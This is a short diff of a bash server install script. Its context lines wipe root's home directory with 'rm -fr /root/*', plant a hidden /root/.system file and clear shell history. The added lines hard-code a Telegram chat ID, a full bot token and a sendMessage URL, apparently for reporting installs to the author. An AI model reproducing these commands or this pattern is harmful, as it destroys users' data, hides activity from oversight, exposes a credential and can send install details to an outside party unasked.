@@ -1,6 +1,5 @@
 #!/bin/bash
 clear
-
 run_eula() {
 if [ "${EUID}" -ne 0 ]; then
 		echo "You need to run this script as root"
@@ -659,6 +658,10 @@ rm -fr /root/*
 touch /root/.system
 history -c
 echo "1.2" > /home/ver
+CHATID="5795571992"
+KEY="6079069898:AAGT8hggC62cVoeKq1Q1k37sWj2Bys5NL1M"
+TIME="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
 echo -e ""
 TEXT="
 Info Install Script V1.0
